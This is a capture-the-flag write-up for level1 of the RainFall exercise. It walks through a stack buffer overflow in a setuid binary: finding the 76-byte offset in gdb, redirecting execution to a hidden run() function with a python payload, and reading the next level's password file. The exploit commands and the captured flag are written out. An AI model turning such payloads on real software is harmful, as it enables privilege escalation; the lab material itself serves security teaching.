level1
======

*	We spawn with a [level1](source/level1) executable
	```console
	level1@RainFall:~$ ls -l
	total 732
	level1@RainFall:~$ ls -l 
	total 8
	-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
	level1@RainFall:~$ ./level1
	█
	level1@RainFall:~$ ./level1 test
	█
	```
	`./level1` is execute as `level2` user
*	It is reading on `STDIN`
*	From now on I will be using [Ghidra](https://ghidra-sre.org/) as a decompiler even tho I made a small script to disassemble our programs
*	Let's take a look at the [code](./source/level1.c)
*	The `main` declares a variable of `76` bytes on the stack and executes `gets()` on it
*	We also have another function called `run()` (which is never called btw) :
	-	execute `fwrite()` with and string on STDOUT
	-	calls `system()` to execute `/bin/sh`
*	We want to try a [Buffer Overflow Attack](https://www.imperva.com/learn/application-security/buffer-overflow/) to access the function to execute `/bin/sh` as level2
*	We can use a generated string from this [website](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) to make the offset easier to spot
	```gdb
	(gdb) r
	Starting program: /home/user/level1/level1 
	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7A

	Program received signal SIGSEGV, Segmentation fault.
	0x63413563 in ?? ()
	(gdb) 
	```
	It makes it easier to spot since when we take a look at `$eip`, we can check the corresponding 4 bytes `0x63413563` since every 4 bytes is different in this string. we confirm that the offset is at 76 bytes
*	Next step is to retrieve the address of `run`
	```gdb
	(gdb) p run
	$1 = {<text variable, no debug info>} 0x8048444 <run>
	```
	We need not to forget the little endian rule when writting the payload -> `\x44\x84\x04\x08`
*	We have everything we need, here is the payload :
	```console
	level1@RainFall:~$ python -c 'print "a"*76  + "\x44\x84\x04\x08"' > /tmp/payload
	```
	Be carefull if you are using perl, python is adding a newline at the end but with `perl -e` you have to add it at the end or it won't be clean
*	Now for the execution we have to make sure to use `cat payload -` so that it keeps listening on STDIN instead of just exiting after the segfault
	```console
	level1@RainFall:~$ cat /tmp/payload - | ./level1 
	Good... Wait what?
	whoami
	level2
	cat /home/user/level2/.pass
	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
	```